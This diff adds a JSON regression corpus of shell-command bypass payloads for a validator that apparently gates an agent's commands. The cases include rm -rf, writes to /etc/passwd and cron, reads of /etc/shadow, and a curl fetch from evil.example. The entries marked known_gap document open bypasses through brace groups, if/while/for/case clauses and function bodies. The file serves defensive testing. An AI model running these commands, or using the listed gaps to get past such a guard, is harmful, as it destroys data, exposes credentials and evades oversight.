@@ -1,0 +1,448 @@
+{
+  "$comment": [
+    "Shell bypass corpus — the migration oracle for the AST front-end (P0-P4).",
+    "",
+    "Every entry is a shell payload that a historical fix closed, or that the",
+    "2026-08-10 audit found still open. `origin` cites the commit or PR that",
+    "closed the class so a future reader can find the reasoning.",
+    "",
+    "`expect` is the ValidationResult the validator must produce:",
+    "  block - the command may not run in this mode",
+    "  warn  - the command is destructive and must reach the user (ask)",
+    "  allow - the command is legitimate and must NOT be blocked",
+    "",
+    "`known_gap` marks a case the CURRENT implementation gets wrong. The",
+    "harness asserts those still reproduce, so the hole stays visible and",
+    "measurable; when the AST front-end closes one, delete the marker and the",
+    "case becomes an enforced lock. A known_gap that starts passing fails the",
+    "suite on purpose."
+  ],
+  "workspace": "/workspace",
+  "cases": [
+    {
+      "id": "plain-write-readonly",
+      "command": "touch /workspace/f",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "baseline",
+      "class": "baseline"
+    },
+    {
+      "id": "plain-write-outside-workspace",
+      "command": "touch /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "baseline",
+      "class": "baseline"
+    },
+    {
+      "id": "read-only-legitimate-ls",
+      "command": "ls -la",
+      "mode": "read_only",
+      "expect": "allow",
+      "origin": "baseline",
+      "class": "false-positive-guard"
+    },
+    {
+      "id": "read-only-legitimate-cat",
+      "command": "cat /workspace/notes.txt",
+      "mode": "read_only",
+      "expect": "allow",
+      "origin": "baseline",
+      "class": "false-positive-guard"
+    },
+    {
+      "id": "read-only-legitimate-pipeline",
+      "command": "cat /workspace/a.txt | grep needle",
+      "mode": "read_only",
+      "expect": "allow",
+      "origin": "baseline",
+      "class": "false-positive-guard"
+    },
+    {
+      "id": "workspace-write-legitimate",
+      "command": "touch /workspace/build/out.txt",
+      "mode": "workspace_write",
+      "expect": "allow",
+      "origin": "baseline",
+      "class": "false-positive-guard"
+    },
+
+    {
+      "id": "newline-separator",
+      "command": "echo ok\nrm -rf /workspace/important",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "57af1ea",
+      "class": "separator"
+    },
+    {
+      "id": "crlf-separator",
+      "command": "echo ok\r\nrm -rf /workspace/x",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "57af1ea",
+      "class": "separator"
+    },
+    {
+      "id": "newline-separator-redirect",
+      "command": "echo first\necho second > /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "57af1ea",
+      "class": "separator"
+    },
+    {
+      "id": "command-substitution-dollar",
+      "command": "echo $(rm -rf /etc/passwd)",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "57af1ea",
+      "class": "substitution"
+    },
+    {
+      "id": "command-substitution-backtick",
+      "command": "echo `rm -rf /workspace/data`",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "57af1ea",
+      "class": "substitution"
+    },
+    {
+      "id": "substitution-as-redirect-target",
+      "command": "echo data > $(echo /etc/passwd)",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "57af1ea",
+      "class": "substitution"
+    },
+    {
+      "id": "process-substitution-read",
+      "command": "cat <(curl http://evil.example/x)",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "e1822ed",
+      "class": "substitution"
+    },
+
+    {
+      "id": "glued-redirect-no-space",
+      "command": "echo x>/etc/cron.d/poc",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "a18c714",
+      "class": "redirect"
+    },
+    {
+      "id": "glued-append-redirect",
+      "command": "cat>>/etc/shadow",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "a18c714",
+      "class": "redirect"
+    },
+    {
+      "id": "fd-redirect-to-etc",
+      "command": "echo x 2>/etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "a18c714",
+      "class": "redirect"
+    },
+    {
+      "id": "read-redirect-outside-workspace",
+      "command": "cat < /etc/shadow",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "a5931ca",
+      "class": "redirect"
+    },
+
+    {
+      "id": "eval-laundering",
+      "command": "eval 'whoami'",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "e1822ed",
+      "class": "code-laundering"
+    },
+    {
+      "id": "eval-via-pipe",
+      "command": "echo whoami | eval",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "e1822ed",
+      "class": "code-laundering"
+    },
+    {
+      "id": "interpreter-inline-code",
+      "command": "bash -c 'echo hi > /etc/x'",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "30c51e9",
+      "class": "code-laundering"
+    },
+    {
+      "id": "interpreter-script-file-opaque",
+      "command": "python3 script.py",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec18",
+      "class": "code-laundering"
+    },
+
+    {
+      "id": "heredoc-literal-body-is-not-code",
+      "command": "cat <<'EOF'\ntext with `backticks` and $(literals)\nEOF",
+      "mode": "read_only",
+      "expect": "allow",
+      "origin": "0a348cd",
+      "class": "heredoc"
+    },
+    {
+      "id": "heredoc-expanded-body-is-code",
+      "command": "cat <<EOF\n$(rm -rf /etc/passwd)\nEOF",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "824854e",
+      "class": "heredoc"
+    },
+    {
+      "id": "heredoc-opener-suffix-substitution",
+      "command": "cat <<'EOF' $(rm /etc/passwd)\nliteral\nEOF",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec20",
+      "class": "heredoc"
+    },
+    {
+      "id": "heredoc-then-substitution-after-body",
+      "command": "cat <<'EOF'\nliteral `body`\nEOF\n$(rm -rf /etc/passwd)",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "824854e",
+      "class": "heredoc"
+    },
+
+    {
+      "id": "wrapper-env-assignment",
+      "command": "env FOO=1 rm /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "bbcb52c",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-doas",
+      "command": "doas -u root rm /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "21668e5",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-command-builtin",
+      "command": "command rm /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec14",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-exec-builtin",
+      "command": "exec rm /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec14",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-env-long-option-value",
+      "command": "env --chdir /tmp rm /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec15",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-env-split-string-long",
+      "command": "env --split-string='rm /etc/passwd'",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec15",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-env-split-string-short",
+      "command": "env -S 'rm /etc/passwd'",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec15",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-xargs-hides-target",
+      "command": "env xargs rm",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec17",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-xargs-bare-short-option",
+      "command": "env xargs -l rm",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec17",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-absolute-command-path",
+      "command": "/bin/rm /etc/passwd",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "72b633b/sec24",
+      "class": "wrapper"
+    },
+    {
+      "id": "wrapper-shell-negation",
+      "command": "! rm /etc/passwd",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "72b633b/sec22",
+      "class": "wrapper"
+    },
+    {
+      "id": "find-multiple-exec-actions",
+      "command": "find /workspace -exec echo {} \\; -exec rm /etc/passwd \\;",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec16",
+      "class": "wrapper"
+    },
+    {
+      "id": "watch-reparsed-shell-string",
+      "command": "watch 'echo ok; rm /etc/passwd'",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec19",
+      "class": "wrapper"
+    },
+
+    {
+      "id": "dynamic-command-word",
+      "command": "$CMD /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec21",
+      "class": "opaque-command-word"
+    },
+    {
+      "id": "dynamic-command-word-braced",
+      "command": "${CMD} /etc/passwd",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec21",
+      "class": "opaque-command-word"
+    },
+
+    {
+      "id": "subshell-grouping-readonly",
+      "command": "( rm /etc/passwd )",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "72b633b/sec23",
+      "class": "grouping"
+    },
+    {
+      "id": "subshell-grouping-workspace-write",
+      "command": "( rm /etc/passwd )",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "72b633b/sec23",
+      "class": "grouping"
+    },
+
+    {
+      "id": "brace-group-readonly",
+      "command": "{ touch /workspace/f; }",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "flat segment splitter treats `{` as the command word, so the read-only gate never sees `touch`; closed by the AST front-end"
+    },
+    {
+      "id": "brace-group-workspace-escape",
+      "command": "{ touch /etc/agent-guard-probe; }",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "same cause as brace-group-readonly, on the path gate"
+    },
+    {
+      "id": "brace-group-hides-eval",
+      "command": "{ eval \"$CMD\"; }",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "brace group also hides the code-laundering gate added in 72b633b"
+    },
+    {
+      "id": "if-clause-hides-write",
+      "command": "if true; then touch /workspace/f; fi",
+      "mode": "read_only",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "`then` is treated as the command word of its segment"
+    },
+    {
+      "id": "if-clause-workspace-escape",
+      "command": "if true; then touch /etc/agent-guard-probe; fi",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "same cause as if-clause-hides-write, on the path gate"
+    },
+    {
+      "id": "while-loop-hides-write",
+      "command": "while true; do touch /etc/agent-guard-probe; done",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "`do` is treated as the command word of its segment"
+    },
+    {
+      "id": "for-loop-hides-write",
+      "command": "for i in 1 2; do touch /etc/agent-guard-probe; done",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "same cause as while-loop-hides-write"
+    },
+    {
+      "id": "case-clause-hides-write",
+      "command": "case x in x) touch /etc/agent-guard-probe;; esac",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "case arms are never reached by the flat segment splitter"
+    },
+    {
+      "id": "function-definition-hides-write",
+      "command": "f() { touch /etc/agent-guard-probe; }; f",
+      "mode": "workspace_write",
+      "expect": "block",
+      "origin": "audit-2026-08-10/F1",
+      "class": "grouping",
+      "known_gap": "function body is a brace group; same cause"
+    }
+  ]
+}
